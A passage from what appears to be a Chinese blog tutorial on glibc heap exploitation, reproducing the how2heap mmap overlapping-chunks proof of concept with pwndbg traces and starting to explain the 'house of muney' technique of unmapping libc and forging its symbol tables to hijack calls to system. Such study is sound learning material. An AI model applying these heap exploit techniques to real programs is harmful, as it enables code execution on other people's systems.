class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Technique should work on all versions of GLibC</span></span><br><span class="line"><span class="comment">Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC written by POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	A primer on Mmap chunks in GLibC</span></span><br><span class="line"><span class="comment">	==================================</span></span><br><span class="line"><span class="comment">	In GLibC, there is a point where an allocation is so large that malloc</span></span><br><span class="line"><span class="comment">	decides that we need a seperate section of memory for it, instead </span></span><br><span class="line"><span class="comment">	of allocating it on the normal heap. This is determined by the mmap_threshold var.</span></span><br><span class="line"><span class="comment">	Instead of the normal logic for getting a chunk, the system call *Mmap* is </span></span><br><span class="line"><span class="comment">	used. This allocates a section of virtual memory and gives it back to the user. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Similarly, the freeing process is going to be different. Instead </span></span><br><span class="line"><span class="comment">	of a free chunk being given back to a bin or to the rest of the heap,</span></span><br><span class="line"><span class="comment">	another syscall is used: *Munmap*. This takes in a pointer of a previously </span></span><br><span class="line"><span class="comment">	allocated Mmap chunk and releases it back to the kernel. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap chunks have special bit set on the size metadata: the second bit. If this </span></span><br><span class="line"><span class="comment">	bit is set, then the chunk was allocated as an Mmap chunk. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap chunks have a prev_size and a size. The *size* represents the current </span></span><br><span class="line"><span class="comment">	size of the chunk. The *prev_size* of a chunk represents the left over space</span></span><br><span class="line"><span class="comment">	from the size of the Mmap chunk (not the chunks directly belows size). </span></span><br><span class="line"><span class="comment">	However, the fd and bk pointers are not used, as Mmap chunks do not go back </span></span><br><span class="line"><span class="comment">	into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of </span></span><br><span class="line"><span class="comment">	the chunk must be page-aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The POC below is essentially an overlapping chunk attack but on mmap chunks. </span></span><br><span class="line"><span class="comment">	This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. </span></span><br><span class="line"><span class="comment">	The main difference is that mmapped chunks have special properties and are </span></span><br><span class="line"><span class="comment">	handled in different ways, creating different attack scenarios than normal </span></span><br><span class="line"><span class="comment">	overlapping chunk attacks. There are other things that can be done, </span></span><br><span class="line"><span class="comment">	such as munmapping system libraries, the heap itself and other things.</span></span><br><span class="line"><span class="comment">	This is meant to be a simple proof of concept to demonstrate the general </span></span><br><span class="line"><span class="comment">	way to perform an attack on an mmap chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For more information on mmap chunks in GLibC, read this post: </span></span><br><span class="line"><span class="comment">	http://tukan.farm/2016/07/27/munmap-madness/</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Extremely large chunks are special because they are allocated in their own mmaped section\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"of memory, instead of being put onto the normal heap.\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"=======================================================\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating three extremely large heap chunks of size 0x100000 \n\n"</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The first mmap chunk goes directly above LibC: %p\n"</span>,top_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The second mmap chunk goes below LibC: %p\n"</span>, mmap_chunk_2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The third mmap chunk goes below the second mmap chunk: %p\n"</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nCurrent System Memory Layout \n"</span> \</span><br><span class="line"><span class="string">"================================================\n"</span> \</span><br><span class="line"><span class="string">"running program\n"</span> \</span><br><span class="line"><span class="string">"heap\n"</span> \</span><br><span class="line"><span class="string">"....\n"</span> \</span><br><span class="line"><span class="string">"third mmap chunk\n"</span> \</span><br><span class="line"><span class="string">"second mmap chunk\n"</span> \</span><br><span class="line"><span class="string">"LibC\n"</span> \</span><br><span class="line"><span class="string">"....\n"</span> \</span><br><span class="line"><span class="string">"ld\n"</span> \</span><br><span class="line"><span class="string">"first mmap chunk\n"</span></span><br><span class="line"><span class="string">"===============================================\n\n"</span> \</span><br><span class="line">);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Prev Size of third mmap chunk: 0x%llx\n"</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Size of third mmap chunk: 0x%llx\n\n"</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Change the size of the third mmap chunk to overlap with the second mmap chunk\n"</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This will cause both chunks to be Munmapped and given back to the system\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">	<span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"New size of third mmap chunk: 0x%llx\n"</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Free the third mmap chunk, which munmaps the second and third chunks\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This next call to free is actually just going to call munmap on the pointer we are passing it.</span></span><br><span class="line"><span class="comment">	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	With normal frees the data is still writable and readable (which creates a use after free on </span></span><br><span class="line"><span class="comment">	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span></span><br><span class="line"><span class="comment">	data is read or written to, the program crashes.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Because of this added restriction, the main goal is to get the memory back from the system</span></span><br><span class="line"><span class="comment">	to have two pointers assigned to the same location.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3); </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Would crash, if on the following:</span></span><br><span class="line"><span class="comment">	mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">	This is because the memory would not be allocated to the current program.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Allocate a very large chunk with malloc. This needs to be larger than </span></span><br><span class="line"><span class="comment">	the previously freed chunk because the mmapthreshold has increased to 0x202000.</span></span><br><span class="line"><span class="comment">	If the allocation is not larger than the size of the largest freed mmap </span></span><br><span class="line"><span class="comment">	chunk then the allocation will happen in the normal section of heap memory.</span></span><br><span class="line"><span class="comment">	*/</span>	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Get a very large chunk from malloc to get mmapped chunk\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This should overlap over the previously munmapped/freed chunks\n"</span>);</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Overlapped chunk Ptr: %p\n"</span>, overlapping_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Overlapped chunk Ptr Size: 0x%llx\n"</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Gets the distance between the two pointers.</span></span><br><span class="line">	<span class="keyword">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n"</span>, distance);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Value of index 0 of mmap chunk 2 prior to write: %llx\n"</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Set the value of the overlapped chunk.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Setting the value of the overlapped chunk\n"</span>);</span><br><span class="line">	overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Second chunk value (after write): 0x%llx\n"</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Overlapped chunk value: 0x%llx\n\n"</span>, overlapping_chunk[distance]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Boom! The new chunk has been overlapped with a previous mmaped chunk\n"</span>);</span><br><span class="line">	assert(mmap_chunk_2[<span class="number">0</span>] == overlapping_chunk[distance]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> *m1 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="keyword">long</span> *m2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="keyword">long</span> *m3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="keyword">long</span> size =  m3[<span class="number">-1</span>]<span class="number">-2</span> + m2[<span class="number">-1</span>]<span class="number">-2</span> + <span class="number">2</span>;</span><br><span class="line">	m3[<span class="number">-1</span>] = size;</span><br><span class="line">	<span class="built_in">free</span>(m3);</span><br><span class="line">	<span class="keyword">long</span> *m4 = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	m4[m2-m4] = <span class="number">0x1122334455667788</span>;</span><br><span class="line">	assert(m2[<span class="number">0</span>] == <span class="number">0x1122334455667788</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-12"><a href="#pwndbg调试-12" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>先调用申请了三个大的内存块（0x100000可以整除4096，是按页对齐的），观察下执行前后的内存布局：<br>在 malloc 之前，并没有创建线程的 heap 段。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem1.png" alt><br>在 malloc 之后，heap 段创建完成。但是由于0x100000 甚至无法从 top chunk 中分配，于是调用sysmalloc从系统中直接申请内存。申请的内存位于 mmap 映射段。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem2.png" alt><br>chunk_m1 的位置在 ld 之上，也就是 chunk_m1 地址比ld的地址高。<br>继续申请一个0x100000大小的内存，也是调用sysmalloc从系统直接申请。但是申请到的位置有了变化。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem3.png" alt><br>chunk_m2 的位置在 libc 之下，也就是 chunk_m2 地址比 libc 的地址低。<br>继续申请 0x100000 大小的 chunk_m3。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem4.png" alt><br>接下来的操作和普通 chunk 的overlapping很像，修改 chunk_m3 的 size 位，覆盖到 chunk_m2，free(chunk_m3) 的时候就是。<br>由于是 mmap chunk，chunk 的size位后三位起到了作用。后三位分别用来标记：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A = Allocated Arena</span><br><span class="line">M = Mmap&apos;d</span><br><span class="line">P = prev in use</span><br></pre></td></tr></table></figure></p>
<p>这里由于chunk 是在 mmap 映射段，所以M位是1，<code>2^1=2</code>，比真实大小要多2。修改chunk_m3的时候也要注意修改到M位。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p m3</span><br><span class="line">$3 = (long *) 0x7ffff77df010</span><br><span class="line">pwndbg&gt; x/4gx 0x7ffff77df000</span><br><span class="line">0x7ffff77df000: 0x0000000000000000      0x0000000000101002</span><br><span class="line">0x7ffff77df010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; p/x mp_.mmap_threshold</span><br></pre></td></tr></table></figure></p>
<p>free(chunk_m3)之后，libc下面那块内存归还给系统了。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem5.png" alt><br>这里注意，当 ptmalloc munmap chunk 时，如果回收的 chunk 空间大小大于 mmap 分配阈值的当前值，并且小于 DEFAULT_MMAP_THRESHOLD_MAX（32 位系统默认为 512KB，64 位系统默认<br>为 32MB），ptmalloc 会把 mmap 分配阈值调整为当前回收的 chunk 的大小。查看目前的<code>mp_.mmap_threshold</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x mp_.mmap_threshold </span><br><span class="line">$6 = 0x202000</span><br></pre></td></tr></table></figure></p>
<p>已经变成归还系统的那部分大小了。<br>再次申请一个 0x300000 大小的内存。这个新的大小要大于 0x202000，因为 <code>mp_.mmap_threshold</code>已经增加到 0x202000。否则将会在 heap 中申请。调用syamalloc在mmap映射段：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem6.png" alt><br>在 mmap_base 下方（实际上就是 libc 下方）。分配是在彼此下方连续进行的。所以 chunk_m4 的地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x301000 - 0x202000 = 0xFF000</span><br><span class="line">0x7ffff77df010 - 0xFF000 = 0x7ffff76e0010</span><br></pre></td></tr></table></figure></p>
<p>布局：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mmapol_newmem.png" alt><br>这时候如果要覆盖 chunk_m2 上的内存，就可以通过 chunk_m4 进行了。</p>
<h3 id="拓展应用-——-house-of-muney"><a href="#拓展应用-——-house-of-muney" class="headerlink" title="拓展应用 —— house of muney"></a>拓展应用 —— house of muney</h3><p>有了上面的基础，可以看接下来的利用部分了。<br>参考链接：<br><a href="https://maxwelldulin.com/BlogPost?post=6967456768" target="_blank" rel="noopener">https://maxwelldulin.com/BlogPost?post=6967456768</a><br>前言：学习这个技术的时候，我真是，难以言说的激动。最初做的时候，我遇到了点困难（其实并不是什么大问题，但是我傻乎乎的被卡住了）。我搜到的这个技术原作者是一个外国人，另外安全客有一个中国大佬的复现和详解，别的找不到了。然后我走投无路之下，用我六级没过的水平向外国原作者写了一封邮件询问，我原本没有希望这个老外会回复我；然后层层搜索找到了中国作者的邮箱，也发了一封邮件。Error404大佬非常可爱，耐心解答了我；我也收到了老外的回复（虽然是我get shell之后才看到，因为要FQ登录google邮箱），这让我更加惊喜了。这个世界还是好人多！</p>
<h4 id="原理-15"><a href="#原理-15" class="headerlink" title="原理"></a>原理</h4><p>我们可以覆盖 mmap 映射段的内存，这块内存中同时也保存着libc.so文件的映射。free掉这块overlap后的内存的同时也会清空这块内存的内容，那么就可以取消 Libc 映射后通过重写符号表（symbol table）来劫持其他的函数地址到我们想要的system函数地址。</p>
<h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><ol>
<li>mmap和munmap<br>这个见上面的mmap_overlapping。munmap 会清空传入的这块内存的内容，也就是可以取消映射libc的映射段。</li>
<li>libc.so.6 文件结构<br>我对此的了解还不够深，有错误的地方请各位大佬指正。<br>在学习过程中警院的同学告诉了我另一种攻击方法——ret2dl-resolve，这和house of muney很像。<br>动态装载器负责将二进制文件及依赖的库加载到内存，这个过程包括了对导入符号（函数和全局变量）的解析。<br>关于某个符号的信息可以在 ELF 文件中的动态部分找到：<code>.gnu.hash</code> 对应符号哈希，<code>.dynsym</code>对应动态链接的符号表，<code>.dynstr</code>对应动态链接的字符串表。查找符号时，动态链接器从 <code>.gnu.hash</code>开始查询，获取符号在动态链接符号表中的偏移量。动态链接器根据这个偏移量读取一个符号，并在字符表中找到这个符号名的偏移量。从字符表中读出符号名称，如果与要查找的符号匹配，则找到该符号，然后从符号表中读出符号信息并返回。<br>所以，我们最终需要的是<code>.gnu.hash</code>和<code>.dynsym</code>这两个节的信息。<br>通过readelf命令查看elf文件结构。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>查看所有条目</span><br><span class="line">pukrquq@ubuntu:~$ readelf -all /home/pukrquq/Downloads/glibc-2.34/64/lib/libc.so.6</span><br><span class="line"><span class="meta">#</span>查看文件的节头（section headers）</span><br><span class="line">pukrquq@ubuntu:~$ readelf -S /home/pukrquq/Downloads/glibc-2.34/64/lib/libc.so.6</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_dynstr.png" alt></p>
<ol>
<li><p>延迟绑定机制<br> 由于延迟绑定机制，符号解析在第一次调用这个函数的时候才会进行，也就是在第一次调用函数的时候会进行上面第二点的解析过程。这里不进行展开，简略说一下大家可以去谷歌搜索资料。<br> 参考资料：<a href="https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/" target="_blank" rel="noopener">https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/</a></p>
<p>也就是要调用的函数必须是在库中覆盖的符号表，在之前也没有被调用过。</p>
</li>
<li><p>符号解析<br> 符号解析的过程比较复杂，这里不展开。参考链接：<a href="https://chowdera.com/2021/06/20210617215010995Q.html" target="_blank" rel="noopener">https://chowdera.com/2021/06/20210617215010995Q.html</a><br> 这里直接跳到知道我们需要修改哪里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l_gnu_bitmask</span><br><span class="line">l_gnu_buckets</span><br><span class="line">l_gnu_chain_zero</span><br><span class="line">Symbol Table Entry</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>所以现在明确了我们的目标：</p>
<ol>
<li>通过 overlap 和 mumap() 覆盖 libc 内存并取消映射。</li>
<li>重写符号表，伪造内存</li>
<li>劫持程序调用以前没有调用过的函数执行代码。（注意参数正确，后面会遇到）</li>
</ol>
<h4 id="调试模式设置"><a href="#调试模式设置" class="headerlink" title="调试模式设置"></a>调试模式设置</h4><p>这里使用的是glibc-2.34，使用patchelf修补。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pukrquq@ubuntu:/home/PycharmProjectspy2/pwn$ gcc -g -o 333 -z lazy 3.c</span><br><span class="line">pukrquq@ubuntu:/home/PycharmProjectspy2/pwn$ patchelf --set-interpreter /home/pukrquq/Downloads/glibc-2.34/64/lib/ld-linux-x86-64.so.2 ./rew</span><br><span class="line">pukrquq@ubuntu:/home/PycharmProjectspy2/pwn$ patchelf --set-interpreter /home/pukrquq/Downloads/glibc-2.34/64/lib/ld-linux-x86-64.so.2 ./333</span><br></pre></td></tr></table></figure></p>
<p>加载ld符号表：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pukrquq@ubuntu:/home/PycharmProjectspy2/pwn$ gdb -q 333</span><br><span class="line">pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from 333...done.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> b main</span><br><span class="line">Breakpoint 1 at 0x64e: file 3.c, line 46.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> r</span><br><span class="line">Starting program: /home/PycharmProjectspy2/pwn/333 </span><br><span class="line">Breakpoint 1, main () at 3.c:46</span><br><span class="line"><span class="meta">pwndbg&gt;</span> set debug-file-directory /home/pukrquq/Downloads/glibc-2.34/elf</span><br><span class="line"><span class="meta">pwndbg&gt;</span> dir /home/pukrquq/Downloads/glibc-2.34/elf</span><br><span class="line">Source directories searched: /home/pukrquq/Downloads/glibc-2.34/elf:$cdir:$cwd</span><br><span class="line"><span class="meta">pwndbg&gt;</span> info sharedlibrary</span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007ffff7dcdba0  0x00007ffff7df0f38  Yes         /home/pukrquq/Downloads/glibc-2.34/64/lib/ld-linux-x86-64.so.2</span><br><span class="line">0x00007ffff7a09060  0x00007ffff7b603dc  Yes         /home/pukrquq/Downloads/glibc-2.34/64/lib/libc.so.6</span><br><span class="line"><span class="meta">pwndbg&gt;</span> add-symbol-file /home/pukrquq/Downloads/glibc-2.34/64/lib/ld-linux-x86-64.so.2 0x00007ffff7dcdba0</span><br><span class="line">add symbol table from file "/home/pukrquq/Downloads/glibc-2.34/64/lib/ld-linux-x86-64.so.2" at</span><br><span class="line">	.text_addr = 0x7ffff7dcdba0</span><br><span class="line">Reading symbols from /home/pukrquq/Downloads/glibc-2.34/64/lib/ld-linux-x86-64.so.2...done.</span><br></pre></td></tr></table></figure></p>
<p>注意先在main处下断点然后运行之后再加载符号表，因为程序要先把libc加载进来。</p>
<h4 id="覆盖libc"><a href="#覆盖libc" class="headerlink" title="覆盖libc"></a>覆盖libc</h4><p>我们的目标是将部分 libc 将从虚拟地址空间中取消映射。于是在上面 overlapping_mmap_chunks 的基础上，再多覆盖 0x16000 的大小。因为在申请第二个之后的大 chunk 的时候，是从libc映射区之后连续分配的。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_chunk2&amp;3.png" alt><br>覆盖示意图：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_glibc.jpg" alt><br>再看一下上面提到的libc.so的节<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_dynstr.png" alt><br>为了不覆盖到<code>.dynstr</code>部分的内容，所以我们只多覆盖 0x16000 大小的 glibc 区域。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> libc_to_overwrite = <span class="number">0x16000</span>;</span><br><span class="line"><span class="keyword">long</span> fake_chunk_size =  mmap_chunk_3[<span class="number">-1</span>]<span class="number">-2</span> + mmap_chunk_2[<span class="number">-1</span>]<span class="number">-2</span> + <span class="number">2</span>;	</span><br><span class="line">fake_chunk_size += libc_to_overwrite;</span><br><span class="line">mmap_chunk_3[<span class="number">-1</span>] = fake_chunk_size;</span><br></pre></td></tr></table></figure></p>
<p>然后释放这块内存，同时会清空这块内存中的数据。再申请一个大于<code>mp_.mmap_threshold</code>的内存，这块内存的指针位于原本的 libc 映射区内。现在我们可以操作<code>.gnu.hash</code>和<code>.dynsym</code>部分内存的内容了。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_overlapchunk.png" alt></p>
<h4 id="开始对比调试"><a href="#开始对比调试" class="headerlink" title="开始对比调试"></a>开始对比调试</h4><p>这里我们运行一个正常程序和一个被覆盖了<code>.gnu.hash</code>和<code>.dynsym</code>的程序，两个对比调试，然后修改需要修补的指针。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_compare.png" alt><br>左边是受攻击程序，右边是正常程序。左边的程序没有显示加载ld符号是因为前面加载过了。<br>两个代码：<br>受到攻击程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span 